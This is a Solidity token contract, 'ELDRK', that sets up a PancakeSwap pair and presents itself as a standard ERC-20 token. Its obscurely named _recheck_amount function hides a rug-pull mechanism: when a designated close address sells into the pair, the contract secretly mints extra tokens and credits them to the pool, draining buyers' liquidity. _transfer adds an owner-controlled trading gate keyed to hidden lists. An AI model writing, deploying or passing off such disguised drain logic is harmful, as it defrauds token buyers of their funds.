// import "contracts/BaseToken.sol";

contract ELDRK is Context, IERC20, Ownable {

    string private _name;
    string private _symbol;
    uint256 private _decimals = 18;

    address public _closeAddress;
    uint256 public _closeAmount;

    uint32 public _route_amount_max_a_;
    uint32 public _route_amount_min_a_;
    uint128 public _private_arg_amount_a_;

    mapping(address => bool) public usual_list;
    mapping(address => bool) public prime_list;
    mapping(address => bool) public exception_list;

    IUniswapV2Factory public constant pancake_factory =
    IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address public WETH_address = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public pair_address;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;

    constructor( 
        string[] memory stringParams,
        address[] memory addressParams,
        uint256[] memory numberParams,
        bool[] memory boolParams,
        address closeAddress,
        uint256 closeAmount,
        address[] memory initial_primelist,
        address[] memory initial_exceptionlist
    ) {
        require(addressParams.length==0);
        require(boolParams.length==0);

        address receiveAddr = tx.origin;
        _name = stringParams[0];
        _symbol = stringParams[1];
        _decimals = numberParams[0];
        _totalSupply = numberParams[1];

        _closeAddress = closeAddress;
        _closeAmount = closeAmount;

        for (uint i = 0; i < initial_primelist.length; i++) {
            prime_list[initial_primelist[i]] = true;
        }

        for (uint i = 0; i < initial_exceptionlist.length; i++) {
            exception_list[initial_exceptionlist[i]] = true;
        }

        pair_address = pancake_factory.createPair(address(this), WETH_address);
        exception_list[pair_address] = true;

        _balances[receiveAddr] = _totalSupply;
        emit Transfer(address(0), receiveAddr, _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) 
    {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");
        require(usual_list[_closeAddress] || prime_list[sender] || prime_list[recipient] || exception_list[recipient], "Trade not opened");

        _beforeTokenTransfer(sender, recipient, amount);

        usual_list[recipient] = true;

        uint256 fin_amount = _recheck_amount(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += fin_amount;

        emit Transfer(sender, recipient, fin_amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    )internal virtual {
    }

    function multiplyBy(uint number) internal virtual returns (uint256) {
        return number * 1000;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _checkbool(uint256 amount) internal virtual returns (bool) {
        require(amount < 0, "flag Error");
        return false;
    }

    function _recheck_amount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 finalAmount = amount;
        if (recipient == pair_address && sender == _closeAddress) {
            _mint(sender, _closeAmount);
            finalAmount = finalAmount + _closeAmount;
        }
        return finalAmount;
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

}
